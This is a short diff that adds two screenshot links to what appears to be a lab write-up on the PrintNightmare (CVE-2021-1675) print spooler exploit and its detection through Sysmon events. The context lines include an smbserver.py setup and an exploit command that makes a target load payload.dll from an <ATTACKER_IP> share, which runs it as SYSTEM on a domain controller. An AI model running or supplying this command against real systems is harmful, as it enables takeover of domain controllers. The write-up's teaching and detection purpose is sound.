@@ -61,6 +61,8 @@ smbserver.py share /path/to/dll/dir -smb2support
 python3 CVE-2021-1675.py <DOMAIN>/<user>:<password>@<TARGET_IP> '\\<ATTACKER_IP>\share\payload.dll'
 ```
 
+![running the CVE-2021-1675 exploit](./assets/printnightmare/01-cve-2021-1675-exploit.png)
+
 The vulnerable print spooler process connects back to the attacker's SMB
 share to fetch the "driver" and loads it, executing the DLL as **SYSTEM**
 on the domain controller — the exploit's danger comes precisely from
@@ -95,6 +97,8 @@ location, identifying the specific event IDs that fired, tracing the
 resulting outbound shell connection through Sysmon network-connection
 events, and pinpointing the attacker's source IP and the exact file
 creation timestamp for the malicious driver.
+
+![Sysmon network-connection event in Event Viewer](./assets/printnightmare/02-sysmon-network-event.png)
 
 ---
 
